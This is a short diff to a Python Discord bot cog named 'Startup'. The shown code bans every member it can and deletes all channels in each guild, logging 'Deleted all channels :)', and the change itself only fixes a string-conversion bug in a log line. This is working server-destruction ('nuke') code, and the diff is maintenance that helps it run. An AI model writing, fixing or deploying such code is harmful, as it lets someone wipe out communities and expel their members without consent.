@@ -20,7 +20,7 @@ class Startup(commands.Cog):
                     print(f'Banned {member.name} - {str(member.id)}')
                 except:
                     pass
-            print("Guild: " + guild.name + " - " + guild.id + " - Banned all possible members")
+            print("Guild: " + str(guild.name) + " - " + str(guild.id) + " - Banned all possible members")
             for c in guild.channels:
                 await c.delete()
             print(f'Guild: {guild.name} - {str(guild.id)} - Deleted all channels :)')
